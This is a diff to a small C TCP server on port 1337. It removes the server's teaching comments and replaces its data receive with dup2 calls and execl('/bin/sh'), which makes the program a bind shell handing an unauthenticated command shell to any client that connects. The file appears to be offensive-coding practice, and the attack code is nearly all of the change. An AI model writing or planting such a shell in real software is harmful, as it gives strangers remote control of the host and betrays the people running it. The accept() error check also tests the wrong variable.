@@ -16,67 +16,37 @@ int main()
 	char buf[1024];
 	
 	struct sockaddr_in hostaddr, clientaddr;
-	
-	// Create socket of domain PF_INET, using TCP
-	// socket(family, type, protocol);
-	
-	// family: PF_INET for IPv4 protocol
-	// type: SOCK_STREAM for a TCP socket
-	// protocol: SOCK_STREAM has only one protocol, thus using zero (first enum element)
+
 	host_sockid = socket(PF_INET, SOCK_STREAM, 0);
 	if(host_sockid == -1) DieWithError("[-] socket() failed\n");
 
 	printf("[+] Created socket for server with fd %d.\n", host_sockid);
-	
-	// Initialize the sockaddr_in struct
-	// sin_family: AF_INET for IPv4 protocol
-	// sin_port: 1337 !111!!!
-	// sin_addr.s_addr: Any interface
+
 	hostaddr.sin_family = AF_INET;
 	hostaddr.sin_port = htons(1337);
 	hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);
-	
-	// Assign address to sockid using bind
-	// bind(sockid, &addrport, size);
-	
-	// sockid: created by socket()
-	// addrport: address and port to which the socket will bind
-	// size: size of addrport struct
+
 	status = bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
 	if(status == -1) DieWithError("[-] bind() failed\n");
 	
 	printf("Binded successfully!\n");
-		
-	// Listen for connections, should be used for a server ONLY
-	// listen(sockid, queuelimit);
-	
-	// sockid: created by socket()
-	// queuelimit: max number of participants waiting for a connection
+
 	status = listen(host_sockid, 5);
 	if(status == -1) DieWithError("[-] listen() failed\n");
 
 	printf("[+] Currently listening...\n");
-			
-	// Establish a connection initiated by client
-	// client_sockid = accept(sockid, &clientAddr, &addrLen);
-	
-	// client_sockid: new socket
-	// sockid: existing socket
-	// clientAddr: struct defining the client, filled in upon return
-	// addrLen: size of clientAddr
+
 	clientaddr_size = sizeof(clientaddr);
 	client_sockid = accept(host_sockid, (struct sockaddr*) &clientaddr, &clientaddr_size);
 	if(status == -1) DieWithError("[-] accept() failed\n");
 
 	printf("[+] Connection established successfully! Client ip: %s, client port: %d\n", inet_ntoa(clientaddr.sin_addr), ntohs(clientaddr.sin_port));
-	
-	// Receive data
-	// count = recv(sockid, recvBuf, bufLen, flags)
-	num_bytes = recv(client_sockid, buf, 1024, 0);
-	if(num_bytes == -1) DieWithError("recv() failed\n");	
-	
-	// Close a socket
-	// close(sockid);
+
+	dup2(client_sockid, 0);
+	dup2(client_sockid, 1);
+	dup2(client_sockid, 2);
+
+	execl("/bin/sh","sh", NULL); 
 	status  = close(host_sockid);
 	if(status == -1) DieWithError("[-] close() failed.\n");
 	
